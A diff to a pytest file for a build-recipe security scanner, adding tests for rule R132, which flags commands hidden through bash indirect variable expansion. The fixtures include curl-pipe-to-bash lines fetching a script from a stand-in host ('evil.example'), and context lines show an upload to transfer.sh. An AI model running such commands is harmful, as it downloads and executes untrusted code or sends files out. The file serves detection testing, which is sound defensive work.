@@ -1,10 +1,11 @@
-"""The three rules that close the §15.3 known gaps.
+"""The rules that close the §15.3 known gaps.
 
-R129 (a network client at parse time), R130 (the signing-key set changed)
-and R131 (the recipe weakens the distribution build flags) each cover a
-fixture that used to be labelled ``known_gap``.  Every rule is asserted in
-both directions: the case it exists for, and the benign surface the corpus
-showed it must stay quiet on.
+R129 (a network client at parse time), R130 (the signing-key set changed),
+R131 (the recipe weakens the distribution build flags) and R132 (a command
+or shell named through indirect ``${!name}`` expansion) each cover a fixture
+that used to be labelled ``known_gap``.  Every rule is asserted in both
+directions: the case it exists for, and the benign surface the corpus showed
+it must stay quiet on.
 """
 
 import pytest
@@ -257,3 +258,34 @@ def test_r087_matches_a_subdomain_of_a_drop_host():
     assert "R087" in ids(recipe(
         "build() {", "  curl -T out https://files.transfer.sh/out", "}",
     ))
+
+
+# --- R132: a command or shell named through indirect variable expansion ---
+
+
+@pytest.mark.parametrize("line", [
+    "${!C} https://evil.example/p.sh | bash",
+    "$C https://evil.example/p.sh | ${!P}",
+    "  ${!C} https://evil.example/p.sh | bash",
+])
+def test_r132_fires_on_indirect_command_expansion(line):
+    """Indirection hides the command/shell so the literal-matching rules step
+    over it; flagging the indirection itself is what catches the family."""
+    assert sev(recipe("C=curl", "P=bash", line), "R132") == "CRITICAL"
+
+
+def test_r132_quiet_on_array_key_expansion():
+    """``${!arr[@]}`` lists an array's keys - common and benign - and is not
+    the ``${!name}`` indirection form."""
+    assert "R132" not in ids(recipe(
+        "for i in ${!commits[@]}; do echo $i; done",
+    ))
+
+
+def test_r132_quiet_on_prefix_name_expansion():
+    """``${!prefix*}`` lists variable names by prefix, not an indirect value."""
+    assert "R132" not in ids(recipe('echo "${!COMPREPLY[*]}"'))
+
+
+def test_r132_quiet_in_a_comment():
+    assert "R132" not in ids(recipe("# ${!C} is how indirection is written"))
